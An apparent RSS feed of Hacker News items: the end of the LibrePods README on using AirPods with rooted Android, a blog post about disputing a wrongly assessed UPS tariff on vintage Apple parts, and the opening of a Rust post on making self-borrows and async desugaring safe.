<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/accessibility.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/accessibility.png" alt="accessibility"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/transparency.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/transparency.png" alt="transparency"></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/hearing-aid.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/hearing-aid.png" alt="hearing-aid"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/hearing-test.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/hearing-test.png" alt="hearing-test"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/hearing-aid-adjustments.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/hearing-aid-adjustments.png" alt="hearing-aid-adjustments"></a></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">here's a very unprofessional demo video</p>
<details open="">
  <summary>
    
    <span>demo-video.mp4</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/46088622/494910131-43911243-0576-4093-8c55-89c1db5ea533.mp4?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMyNjA1MDEsIm5iZiI6MTc2MzI2MDIwMSwicGF0aCI6Ii80NjA4ODYyMi80OTQ5MTAxMzEtNDM5MTEyNDMtMDU3Ni00MDkzLThjNTUtODljMWRiNWVhNTMzLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTExMTYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMTE2VDAyMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE3MmM0Y2I2ZmE2OTk3MTE0M2QxNTZjZjdiZWViNjdlMGMyYTdmZWQ4YmZmZGM1Y2NkYTY4YzZlNmI5ZWRlODQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.j43X8P814WulM4IsoRE6KxxWma-CYHK6uTmQu-ob2U0" data-canonical-src="https://private-user-images.githubusercontent.com/46088622/494910131-43911243-0576-4093-8c55-89c1db5ea533.mp4?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMyNjA1MDEsIm5iZiI6MTc2MzI2MDIwMSwicGF0aCI6Ii80NjA4ODYyMi80OTQ5MTAxMzEtNDM5MTEyNDMtMDU3Ni00MDkzLThjNTUtODljMWRiNWVhNTMzLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTExMTYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMTE2VDAyMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE3MmM0Y2I2ZmE2OTk3MTE0M2QxNTZjZjdiZWViNjdlMGMyYTdmZWQ4YmZmZGM1Y2NkYTY4YzZlNmI5ZWRlODQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.j43X8P814WulM4IsoRE6KxxWma-CYHK6uTmQu-ob2U0" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><h4 tabindex="-1" dir="auto">Root Requirement</h4><a id="user-content-root-requirement" aria-label="Permalink: Root Requirement" href="#root-requirement"></a></p>
<div dir="auto"><p dir="auto">Caution</p><p dir="auto"><strong>You must have a rooted device with Xposed to use LibrePods on Android.</strong> This is due to a <a href="https://issuetracker.google.com/issues/371713238" rel="nofollow">bug in the Android Bluetooth stack</a>. Please upvote the issue by clicking the '+1' icon on the IssueTracker page.</p>
<p dir="auto">There are <strong>no exceptions</strong> to the root requirement until Google merges the fix.</p>
</div>
<p dir="auto">Until then, you must xposed. I used to provide a non-xposed method too, where the module used overlayfs to replace the bluetooth library with a locally patched one, but that was broken due to how various devices handled overlayfs and a patched library. With xposed, you can also enable the DID hook enabling a few extra features.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Bluetooth DID (Device Identification) Hook</h2><a id="user-content-bluetooth-did-device-identification-hook" aria-label="Permalink: Bluetooth DID (Device Identification) Hook" href="#bluetooth-did-device-identification-hook"></a></p>
<p dir="auto">Turns out, if you change the manufacturerid to that of Apple, you get access to several special features!</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Multi-device Connectivity</h3><a id="user-content-multi-device-connectivity" aria-label="Permalink: Multi-device Connectivity" href="#multi-device-connectivity"></a></p>
<p dir="auto">Upto two devices can be simultaneously connected to AirPods, for audio and control both. Seamless connection switching. The same notification shows up on Apple device when Android takes over the AirPods as if it were an Apple device ("Move to iPhone"). Android also shows a popup when the other device takes over.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Accessibility Settings and Hearing Aid</h3><a id="user-content-accessibility-settings-and-hearing-aid" aria-label="Permalink: Accessibility Settings and Hearing Aid" href="#accessibility-settings-and-hearing-aid"></a></p>
<p dir="auto">Accessibility settings like customizing transparency mode (amplification, balance, tone, conversation boost, and ambient noise reduction), and loud sound reduction can be configured.</p>
<p dir="auto">All hearing aid customizations can be done from Android, including setting the audiogram result. The app doesn't provide a way to take a hearing test because it requires much more precision. It is much better to use an already available audiogram result.</p>
<p dir="auto">To enable these features, enable App Settings -&gt; <code>act as Apple Device</code>.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">A few notes</h4><a id="user-content-a-few-notes" aria-label="Permalink: A few notes" href="#a-few-notes"></a></p>
<ul dir="auto">
<li>
<p dir="auto">Due to recent AirPods' firmware upgrades, you must enable <code>Off listening mode</code> to switch to <code>Off</code>. This is because in this mode, louds sounds are not reduced.</p>
</li>
<li>
<p dir="auto">If you have take both AirPods out, the app will automatically switch to the phone speaker. But, Android might keep on trying to connect to the AirPods because the phone is still connected to them, just the A2DP profile is not connected. The app tries to disconnect the A2DP profile as soon as it detects that Android has connected again if they're not in the ear.</p>
</li>
<li>
<p dir="auto">When renaming your AirPods through the app, you'll need to re-pair them with your phone for the name change to take effect. This is a limitation of how Bluetooth device naming works on Android.</p>
</li>
<li>
<p dir="auto">If you want the AirPods icon and battery status to show in Android Settings app, install the app as a system app by using the root module.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Star History</h2><a id="user-content-star-history" aria-label="Permalink: Star History" href="#star-history"></a></p>
<p dir="auto"><a href="https://star-history.com/#kavishdevar/librepods&amp;Date" rel="nofollow"><img src="https://camo.githubusercontent.com/d502fca3c2b3ef10974d625ec384192b056b257b3989339366c6799f83e5ecb9/68747470733a2f2f6170692e737461722d686973746f72792e636f6d2f7376673f7265706f733d6b617669736864657661722f6c69627265706f647326747970653d44617465" alt="Star History Chart" data-canonical-src="https://api.star-history.com/svg?repos=kavishdevar/librepods&amp;type=Date"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">LibrePods - AirPods liberated from Apple‚Äôs ecosystem
Copyright (C) 2025 LibrePods contributors</p>
<p dir="auto">This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published
by the Free Software Foundation, either version 3 of the License.</p>
<p dir="auto">This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.</p>
<p dir="auto">You should have received a copy of the GNU Affero General Public License
along with this program over <a href="https://github.com/kavishdevar/librepods/blob/main/LICENSE">here</a>. If not, see <a href="https://www.gnu.org/licenses/" rel="nofollow">https://www.gnu.org/licenses/</a>.</p>
<p dir="auto">All trademarks, logos, and brand names are the property of their respective owners. Use of them does not imply any affiliation with or endorsement by them. All AirPods images, symbols, and the SF Pro font are the property of Apple Inc.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[When UPS charged me a $684 tariff on $355 of vintage computer parts (293 pts)]]></title>
            <link>http://oldvcr.blogspot.com/2025/11/when-ups-charged-me-684-tariff-on-355.html</link>
            <guid>45941563</guid>
            <pubDate>Sat, 15 Nov 2025 23:55:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://oldvcr.blogspot.com/2025/11/when-ups-charged-me-684-tariff-on-355.html">http://oldvcr.blogspot.com/2025/11/when-ups-charged-me-684-tariff-on-355.html</a>, See on <a href="https://news.ycombinator.com/item?id=45941563">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-5082726271334179629" itemprop="description articleBody">
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjwphOIBJNMT4yciT93GgS2WSQvAfFKHKCLVbloburRMuqZzuT5jH02Xa28qTZ2TjrBs6LJP0Fi4WHx1sqRcyd3hmSt_x6a69UKFtYoMs4OGtOJ7r3nlOwiMFQLCqMFi_Rr_ObTgp3xcdzuX59DPWlD3ygjvaqkB3qykcX0Er3kIPh2nwp1X0j0K7jaUt4/s2912/upyourps.png"><img alt="" data-original-height="1586" data-original-width="2912" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjwphOIBJNMT4yciT93GgS2WSQvAfFKHKCLVbloburRMuqZzuT5jH02Xa28qTZ2TjrBs6LJP0Fi4WHx1sqRcyd3hmSt_x6a69UKFtYoMs4OGtOJ7r3nlOwiMFQLCqMFi_Rr_ObTgp3xcdzuX59DPWlD3ygjvaqkB3qykcX0Er3kIPh2nwp1X0j0K7jaUt4/s320/upyourps.png" width="320"></a></p><p>

I try not to write anything even vaguely political on this blog because we have a variety of views on a variety of subjects and no one is here for that. We can all enjoy our geriatric little silicon artifacts together regardless of your electoral persuasion. But I was hopping mad this week, and the reason is actually on-topic, because I got hit with US Customs tariffs close to double the cost of the vintage items I was ordering and more than the items were worth. This eventually got straightened out, but it wouldn't have happened without my complaint and some time on the phone.
</p><p>
Although we make regular trips down under, your humble author is based in California and so is the Floodgap computer lab. For newly manufactured items and parts it has generally been my policy to buy parts from United States sellers even prior to the tariffs, mostly because that gets around various irregularities and it arrives more quickly. If they're going to drop-ship then it's their problem, not mine, because they advertised it was already here. Since such items are typically newly produced, the current tariffs would logically apply and this policy thus has the additional benefit of me not having to deal with that directly: any tariff should already have been paid to get them States-side.
</p><p>
But for NOS and used parts, especially if you are a collector like I am for certain systems, you buy where you can find them. Coincidentally I wanted to buy a second Apple Network Server logic board since my ANS 700 is acting a little weird (don't say caps) and I still want a good spare for the ANS 500. These don't exactly grow on trees but, as it turns out, the seller I bought my current spare logic board from (pre-tariffs) had another in stock. The logic board doesn't come with the regular ANS AIX ROM SIMM nor cache, so we'll want one each of those just in case, and he also had an Apple BTO Twin Turbo video card (I believe originally for the Power Macintosh 9500) which might also be nice for one of the other beige PCI Macs. These are all new old stock items in their Apple Service packaging because obviously Apple hasn't made nor sold any of these parts in decades. Per the seller, they came from the teardown of new machines which Apple was unable to sell and got turned into official surplus new stock. The seller is in an European Union country, so we're not talking some shady Shenzhen shop operating off an alley liftgate. (I'm not naming the seller because none of this is his fault and I'm sure he'd not like to be contacted about this.)
</p><p>
The items came to ‚Ç¨296.00, about US$355 at the spot exchange rate, plus ‚Ç¨48.10 for UPS shipping. This would have been well-under the prior <i>de minimis</i> exemption even with the shipping rolled in. We had to do UPS because his particular country's postal service limits shipment value to the United States to US$100 due to the tariffs, causing him to spend a substantial amount of time at the UPS drop-off depot and on the paperwork, which was way more than he was required to do and I very much appreciate. For any import you need to come up with a Harmonized System code for what you're shipping, which then maps to a Harmonized Tariff Schedule code specific to the United States. These parts are all populated PCBs and most populated boards are, by prior rulings, classified with <a href="https://rulings.cbp.gov/search?term=8473.30">an HTS code of 8473.30</a>, which is what the seller tagged all four items with. This code is for "Parts and accessories of the machines of heading 8471 [Automatic data processing machines and units thereof]." If you look under the Harmonized Tariff Schedule search engine for this code, you <a href="https://hts.usitc.gov/search?query=847330">find a duty rate</a> for certain subheadings that at <em>most</em> would be 35 percent, or even if these were products of the People's Republic of China (they're old enough that I don't know their exact provenance, but I have no evidence to believe these were originally), then maybe, maybe, <em>maybe</em> <a href="https://hts.usitc.gov/search?query=99038803">an additional 25 percent</a>. The declared value was the purchase price in euros and he even picked up the insurance. The package left the depot uneventfully and worked its way across the continent.
</p><p>
The first sign of trouble was over the weekend when I got an unexpected message.

</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRO6uX353u4XAiNm_52JHxvDYCsY9pjQuaDpUZLmoEEOD_y5WuSK4DiZlsnwZsktqT8Uh51jWcycpNaTbVTsK0651qPy26Lyal3BEx0Se0cVXkcq8c24iOTAev5yUCP0DgCIUVhyG_DY2f5Yv5b_BgxJhmLfNO9rOzkbS568n6LDX6TmC2Y6TZLaiL5z8/s1702/upyourups-2.png"><img alt="" data-original-height="1702" data-original-width="1668" height="320" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRO6uX353u4XAiNm_52JHxvDYCsY9pjQuaDpUZLmoEEOD_y5WuSK4DiZlsnwZsktqT8Uh51jWcycpNaTbVTsK0651qPy26Lyal3BEx0Se0cVXkcq8c24iOTAev5yUCP0DgCIUVhyG_DY2f5Yv5b_BgxJhmLfNO9rOzkbS568n6LDX6TmC2Y6TZLaiL5z8/s320/upyourups-2.png"></a></p><p>

The UPS shipping agent had indicated the parcel was subject to <a href="https://www.cbp.gov/trade/programs-administration/entry-summary/232-tariffs-aluminum-and-steel-faqs">Section 232 tariffs</a> on steel and aluminum, which required me to fill out a UPS-specific form attesting to the steel and aluminum content of the package. (This is an important distinction because Section 232 is not currently part of <a href="https://www.supremecourt.gov/oral_arguments/argument_transcripts/2025/24-1287_097c.pdf">the present matter before the U.S. Supreme Court</a> (PDF), only <a href="https://www.swlaw.com/publication/what-if-the-supreme-court-overrules-the-reciprocal-tariffs-plan-now-for-refunds-protests-and-contract-reconciliation/">reciprocal tariffs under the IEEPA</a>.) There should be little or no aluminum in these because the board and traces would be copper. However, a PCI card is probably going to have a steel bracket, so I looked at the typical mass for those and picked a sufficiently high number of 149g, almost certainly an overestimate but that's always safest with this stuff, then looked at the spot price of stainless steel and based on that weight computed a steel content value of $0.48. I marked "not applicable" for everything else and sent it back. They accepted that.
</p><p>
In the background, all this goes into a U.S. Customs and Border Protection Form 7501, also known as an Entry Summary. It is important to realize that in this circumstance, with UPS as the broker, you are <em>not</em> actually the importer of record ‚Äî they are. You are the "ultimate consignee." Based on the information provided and the judgement of the broker's agent, then a tariff is assigned and added to the paperwork, which is "assessed" by CBP but in practice is being assessed by the broker based on what they expect CBP would charge under current regulation. Ordinarily you don't see this form. CBP does spot-check these but the majority just go through. Since UPS is the importer in this situation, they also pay the tariff they computed "in advance" to clear customs, and then they charge you for that plus their broker fee.
</p><p>
It took several more days for the actual tariff bill to arrive, which was early Monday morning. Now, the initial E-mail said this:

</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhz3mJRRRVpyOUdo0bPPC4ZPIgHYDTaBL9yvPapat_CUPHIHJL1DjG1nbiLWRsu3tnHK6Ar3gLDc5u0AIHjyaPcDk5epS-Ojwmlnft8i2A5SXZDuZ5cIA0VRt-kQy4-YsGqMJDFxpYdXDUVXTW-OIxp2Mx0UTt10ynbVgt0cwPXPuauiIWx2Cez8mQLt4c/s1804/upyourups-3.png"><img alt="" data-original-height="1804" data-original-width="1668" height="320" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhz3mJRRRVpyOUdo0bPPC4ZPIgHYDTaBL9yvPapat_CUPHIHJL1DjG1nbiLWRsu3tnHK6Ar3gLDc5u0AIHjyaPcDk5epS-Ojwmlnft8i2A5SXZDuZ5cIA0VRt-kQy4-YsGqMJDFxpYdXDUVXTW-OIxp2Mx0UTt10ynbVgt0cwPXPuauiIWx2Cez8mQLt4c/s320/upyourups-3.png"></a></p><p>

Yes, the initial bill was for US$711. When I logged in, however, it gave me a total of $698 because it hadn't yet been delivered, which included a $14 brokerage fee.

</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4IQTh6fo1ImSoo2TL8H7pDwB4OtcnDAwlo4mlZwBVkjlYai32RuU-nF6cDioi_kuIsbFLZSeM9cyvJKPHZREcvfp3WsXhIbVMx5xqS80DvjPCibAViqcq635sv_Eh-CkzLulfQXRCnfMCCZnuxkAuM87tumEaJMoREgPPokLnzoZIB8GqTOKM98yCTU0/s2906/upyourups-4.png"><img alt="" data-original-height="1201" data-original-width="2906" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4IQTh6fo1ImSoo2TL8H7pDwB4OtcnDAwlo4mlZwBVkjlYai32RuU-nF6cDioi_kuIsbFLZSeM9cyvJKPHZREcvfp3WsXhIbVMx5xqS80DvjPCibAViqcq635sv_Eh-CkzLulfQXRCnfMCCZnuxkAuM87tumEaJMoREgPPokLnzoZIB8GqTOKM98yCTU0/s320/upyourups-4.png" width="320"></a></p><p>

Time was of the essence, however, because it was arriving <em>that day</em>. I was absolutely incandescent to have to do it, but I paid the entire charge in full on the spot, and this is <em>the correct thing to do.</em> The last thing you want is for your package to get redirected to a warehouse pending your payment, because any shipper will start tacking on storage fees and they have no incentive to get it out of storage quickly. For UPS, a direct quote from their own agents, "Warehouse charges will be added on shipments that are held in our warehouse over two business days at a rate of $20.00 per day and $0.04 per pound. ... On the 15th day, all shipments will be eligible for General Order warehousing by U.S. Customs. Any shipment moved to a G.O. warehouse will be assigned additional warehouse fees over and above any UPS warehouse fees. If imposed, these fees must be paid in full before the shipment can be removed." Obviously I wanted no part of that.
</p><p>
After I had been advised by the system the package would be delivered as scheduled, I then relentlessly abused the AI chatbot on UPS' home page until it asked for my phone number and I got a callback into their phone support line. The first person on the line advised me they didn't handle tariffs and transferred me to another department, after which I spent (not an exaggeration) 45 minutes on hold until it was answered. This new agent said that this was dealt with through a specific subgroup on the UPS post entry team that didn't do anything by phone. (These brokerage teams generally operate out of the Kentucky UPS Worldport hub at Louisville Muhammad Ali International Airport, formerly Standiford Field, hence its IATA code of SDF that also turns up in UPS documentation.) He gave me an E-mail address that looked like line noise but I confirmed it twice with him and also that I had to put the tracking number into the subject line with the magic words "Disputing Duties and Custom Charges." I indicated in the message the fees were paid but that I believed they were unreasonable and incorrect, and also pointed out I submitted the Section 232 paperwork when requested.
</p><p>
It took a day to get a reply, then came the United States Veterans' Day holiday, and finally I heard back yesterday from a second agent that they had "corrected this shipment." What they had done was file an amended Form 7501 and this 7501 they actually sent me so I could see the results. The declared value was changed to US$342 (I presume a difference in the spot exchange rate at the time of filing) and now it had two HTSUS numbers. The entire $342 was attributed to <a href="https://hts.usitc.gov/search?query=8473.30.2000">8473.30.2000</a>, a slightly different code for "Parts and accessories, including face plates and lock latches, of printed circuit assemblies" which might be referring to the bracket I declared in the Section 232 form. There was no tariff on this ("FREE"). However, a second code <a href="https://hts.usitc.gov/search?query=99030220">9903.02.20</a> was added, a long-winded way of saying a tariff (in this case 15%) on "articles the product of the European Union." This was $51.30 and the final tariff.
</p><p>
Everything arrived safely, by the way, and in excellent condition (though I cracked open the antistatic bag on the ANS board to take off the Maxell battery which Apple always shipped logic boards with back then). However, I would like to point out for the sake of accuracy that the ANS logic board, ROM SIMM and cache DIMM have no country of origin printed on them. Only the Twin Turbo card does, and it says ...

</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7B2-6rjm9Xk610XOOuYNQb9w-E7i8E4IEyDwbzjj5hEdHvioIl9jot8cL6rwI-f8H8h4XsBrBUOoT5LGbSTuNMpZ8WdX2H7MIsrRxAID_aZD-Rf2ohHp3R5o7vbP0rxGVV28zWsAJHZqs23TkukVgNY7GwM18cdqAnEFIjp_8K86vCQ2KxcdHhFiX-TY/s4080/PXL_20251115_231859295~2.jpg"><img alt="" data-original-height="3072" data-original-width="4080" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7B2-6rjm9Xk610XOOuYNQb9w-E7i8E4IEyDwbzjj5hEdHvioIl9jot8cL6rwI-f8H8h4XsBrBUOoT5LGbSTuNMpZ8WdX2H7MIsrRxAID_aZD-Rf2ohHp3R5o7vbP0rxGVV28zWsAJHZqs23TkukVgNY7GwM18cdqAnEFIjp_8K86vCQ2KxcdHhFiX-TY/s320/PXL_20251115_231859295~2.jpg" width="320"></a></p><p>

.. but since it wasn't the major part of the order it seemed like I'd be wasting even more time over ten or fifteen bucks to appeal this too. Your mileage and motivation may vary.
</p><p>
Now that UPS was into me for $632.70, the revising agent said, "Any difference between the amount paid and the amount now reflected will be auto-refunded to you. Most of the time, this is done by check sent to the billing address, you can expect this between 2-6 weeks." They didn't say when they don't use a check (I paid with a credit card), but they did give me a phone number for accounting, which I'll call if UPS fails to pay back this particular interest-free loan.
</p><p>
So that's the sordid tale. Even though UPS (mostly) made this right, I'm still unhappy with them for screwing up so badly in the first place because I'm out the money until they get around to reimbursing me. You'd think someone would have noticed that a thumping big duty like that seemed a little weird for a transaction of this size and maybe called a supervisor or something. The fact it could be so promptly appealed ‚Äî and reversed in a few days, something that hardly ever happens with the federal government ‚Äî pretty much demonstrates it was their call to ding it for that much in duty in the first place. I'm also unhappy with them for only alerting me to the final cost of the tariff when the shipment was inbound and due for delivery instead of earlier when it was assessed, because they have you over a barrel at that point unless you want to take your chances with their brokerage warehouse. This obviously nets them more money with the people who won't pay up immediately, but it's undeniably pretty bad customer service. Unfortunately, my unscientific survey of reports in the UPS Reddit indicate I am far from the only person to get a disproportionate assessment of this type.
</p><p>
Regardless, if this happens to you ‚Äî whether it's FedEx or DHL or UPS or whatever ‚Äî <em>pay it</em> and <em>then</em> appeal it. Don't let your shipment go to a warehouse and don't bounce it back to the sender; since odds are the shipper (because they are likely the importer of record) has already paid the duty, they're going to want their money back and you'll be out the money <em>and</em> the items. But, by golly, appeal it: just because you might agree with it politically doesn't mean they did it right.

</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The inconceivable types of Rust: How to make self-borrows safe (2024) (112 pts)]]></title>
            <link>https://blog.polybdenum.com/2024/06/07/the-inconceivable-types-of-rust-how-to-make-self-borrows-safe.html</link>
            <guid>45941443</guid>
            <pubDate>Sat, 15 Nov 2025 23:31:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.polybdenum.com/2024/06/07/the-inconceivable-types-of-rust-how-to-make-self-borrows-safe.html">https://blog.polybdenum.com/2024/06/07/the-inconceivable-types-of-rust-how-to-make-self-borrows-safe.html</a>, See on <a href="https://news.ycombinator.com/item?id=45941443">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>One of the first things any Rust programmer learns is that you can‚Äôt pass an object and a reference to that object around at the same time. It‚Äôs impossible to do, even indirectly. This limitation has been the subject of countless questions on Stack Overflow and posts on Reddit and the Rust forums and anywhere else where Rust programmers might ask for help. It‚Äôs so well-known that most people treat it like an axiom, not just a limitation of Rust <em>as it currently exists</em>, but an inherent limitation of borrow checking <em>in general</em>.</p>

<p>However, that‚Äôs not the case. In fact, with the right perspective, the way to support it is obvious. In this post, I‚Äôll walk through the steps and show how self-borrows and much more could be supported in a hypothetical alternate or future version of Rust.</p>

<h3 id="but-first-some-obligatory-disclaimers">But first, some obligatory disclaimers</h3>

<p>To be clear, when I say something can‚Äôt be done in Rust, what I mean is that it can‚Äôt be done <em>in a safe, zero-cost way</em>. As an army of internet commenters are no doubt rushing to observe, any limitation of a static type system can be bypassed by using unsafety or runtime checks instead (e.g. ‚Äúlol, just wrap everything in <code>Arc&lt;Mutex&lt;T&gt;&gt;</code>‚Äù or ‚Äúlol, just build your own memory management on top of <code>Vec</code> indices‚Äù). And the fact that a less safe or efficient workaround exists <em>is</em> of great interest to people who just need to solve a problem quickly. But from a language design perspective, the pertinent fact is that Rust‚Äôs type system has gaps which make certain common tasks impossible to do <em>in a way that lets Rust be Rust</em>, and not just a glorified C or Javascript.</p>

<p>Lastly, this post will discuss changes purely from a type checking perspective without regard to how hard they‚Äôd actually be to implement. In a major real-world language like Rust, <em>any</em> change, no matter how trivial, has a huge cost in terms of ecosystem, documentation, tooling, backwards compatibility, etc. But I‚Äôm a language design hobbyist, not a Rust compiler engineer, so language design is the part I‚Äôll speak about.</p>

<p>So how do you type-check self borrows? The trick is actually to adopt an even more ambitious goal, <em>safe async functions</em>.</p>

<h2 id="a-brief-history-of-rust">A brief history of Rust</h2>

<p>Rust 1.0 shipped with no support whatsoever for non-movable types. The fact that any value of any type could be arbitrarily memcpy‚Äôd around and still work was a core assumption of the language.</p>

<p>However, it didn‚Äôt take long before people realized that non-movable types are actually very useful. In particular, async functions nearly always produce non-movable future types, so you can‚Äôt have async Rust without support in some fashion for non-movable types.</p>

<p>Sadly, it was too late to do things properly (i.e. a <code>Move</code> auto-trait), but they were able to at least hack in partial support via the <a href="https://doc.rust-lang.org/std/pin/struct.Pin.html"><code>Pin</code></a> type, added in Rust 1.33.0.</p>

<h3 id="but-not-for-thee">‚Ä¶but not for thee</h3>

<p>Now if you‚Äôre like me, you might have thought, ‚ÄúPin is added, which means support for self-borrows. Great, now I can refactor and simplify all my code!‚Äù Unfortunately, that‚Äôs not what actually happened.</p>

<p><code>Pin</code> made it possible for Rust code to <em>work with</em> and <em>pass around</em> non-movable types, but there was still no way to actually <em>create</em> them. That is a bit of dark magic that the compiler jealously hoards for itself. Whenever you write an async function, the compiler will magically generate a secret non-movable type, and <code>Pin</code> makes it possible to work with these types, but there is still no way to actually create self-referential types yourself (again, in safe, zero-cost code).</p>

<p>However, <strong>what if it didn‚Äôt have to be this way?</strong> Personally, I think async functions (and closures) should be desugared into 100% safe Rust code that the user <em>could</em> have written themselves if they wanted to. Not because users would necessary actually want to do that very often, but because having a desugared version of every magic feature is useful didactically and for low-level libraries, and because it forces Rust to be <em>honest about its type system</em> instead of papering over the cracks with compiler magic.</p>

<p>Since async functions have self-borrows, supporting them conveniently also implies support for self-borrows more generally. Now the only question is how to actually support safe async functions.</p>

<p>The rest of this post is divided into two parts. In part 1, I will cover the changes needed from a high level type system perspective, while in part 2, I‚Äôll cover the remaining low level details.</p>

<h2 id="part-1-the-value-level">Part 1: The value level</h2>

<p>In order to make async functions possible in (safe) Rust, we first have to figure out why they <em>aren‚Äôt</em> possible already. Most people would answer ‚Äúasync functions have self-borrows, and it is impossible to support self-borrows in the borrow checker‚Äù, but that is the wrong way to look at things. The <em>actual</em> answer is that <strong>it is impossible to name the types of local variables</strong>.</p>

<p>To see why this is, consider how you would go about desugaring an async function. Suppose we have a simple async function <code>foo</code> that adds some numbers and calls another async function like this:</p>

<div><pre><code><span>fn</span> <span>sub</span><span>()</span> <span>-&gt;</span> <span>Pin</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> <span>Future</span><span>&lt;</span><span>Output</span><span>=</span><span>()</span><span>&gt;&gt;&gt;</span> <span>{</span><span>todo!</span><span>()}</span>

<span>async</span> <span>fn</span> <span>foo</span><span>()</span> <span>-&gt;</span> <span>u32</span> <span>{</span>
    <span>let</span> <span>x</span> <span>=</span> <span>12345</span><span>;</span>
    <span>let</span> <span>f</span> <span>=</span> <span>sub</span><span>();</span>
    <span>f</span><span>.await</span><span>;</span>
    
    <span>let</span> <span>y</span> <span>=</span> <span>x</span> <span>*</span> <span>2</span><span>;</span>
    <span>let</span> <span>f2</span> <span>=</span> <span>sub</span><span>();</span>
    <span>f2</span><span>.await</span><span>;</span>
    
    <span>x</span> <span>+</span> <span>y</span>
<span>}</span>
</code></pre></div>

<p>How would we desugar <code>foo</code> by hand? We need to create a custom Future type <code>Foo</code> with a state machine representing the possible states of the original <code>foo</code> function. Specifically, we need a state machine with one state per <code>await</code> point in the function, plus a begin and end state. And the contents of each state are just the local variables that are live at that point in the function.</p>

<p>Therefore, our custom state machine type would look like this:</p>

<div><pre><code><span>enum</span> <span>Foo</span> <span>{</span>
    <span>Initial</span><span>,</span>
    <span>Await1</span><span>{</span><span>x</span><span>:</span> <span>u32</span><span>,</span> <span>f</span><span>:</span> <span>Pin</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> <span>Future</span><span>&lt;</span><span>Output</span><span>=</span><span>()</span><span>&gt;&gt;&gt;</span><span>},</span>
    <span>Await2</span><span>{</span><span>x</span><span>:</span> <span>u32</span><span>,</span> <span>y</span><span>:</span> <span>u32</span><span>,</span> <span>f2</span><span>:</span> <span>Pin</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> <span>Future</span><span>&lt;</span><span>Output</span><span>=</span><span>()</span><span>&gt;&gt;&gt;</span><span>},</span>
    <span>Final</span><span>,</span>
<span>}</span>
